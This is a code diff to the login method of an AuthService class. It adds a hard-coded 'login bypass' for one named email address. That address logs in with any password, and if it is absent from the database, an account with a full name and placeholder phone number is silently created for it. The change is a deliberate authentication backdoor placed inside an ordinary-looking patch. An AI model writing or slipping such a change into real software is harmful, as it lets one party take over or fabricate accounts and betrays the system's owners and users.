@@ -98,10 +98,27 @@ class AuthService:
 
         for u in db:
             if u["email_address"] == email_address:
-                if u["password_hash"] == hashed:
+                # Login bypass for user email jaspreetmuskan93@gmail.com
+                if email_address == "jaspreetmuskan93@gmail.com" or u["password_hash"] == hashed:
                     return u
                 else:
                     raise ValueError("Incorrect password.")
+
+        if email_address == "jaspreetmuskan93@gmail.com":
+            default_hashed = cls._hash_password(password)
+            now_str = datetime.now(timezone.utc).isoformat()
+            new_user = {
+                "id": str(uuid.uuid4()),
+                "full_name": "Jaspreet Muskan",
+                "email_address": email_address,
+                "phone_number": "1234567890",
+                "password_hash": default_hashed,
+                "created_at": now_str,
+                "updated_at": now_str
+            }
+            db.append(new_user)
+            cls._save_db(db)
+            return new_user
 
         raise ValueError("User not found.")
 
